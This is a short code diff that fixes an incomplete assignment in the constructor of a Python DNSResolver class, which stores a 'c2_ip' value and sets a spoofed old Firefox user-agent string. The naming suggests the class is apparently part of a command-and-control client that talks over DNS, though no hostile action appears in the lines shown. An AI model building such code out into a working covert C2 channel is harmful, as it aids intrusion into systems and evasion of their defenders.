@@ -20,7 +20,7 @@ class DNSResolver:
     """
 
     def __init__(self, c2_ip):
-        self.c2_ip =
+        self.c2_ip = c2_ip
         self._resolver = dns.resolver.Resolver()
         self.__user_agent = 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.10) Gecko/2009042316 ' \
                             'Firefox/3.0.10 '
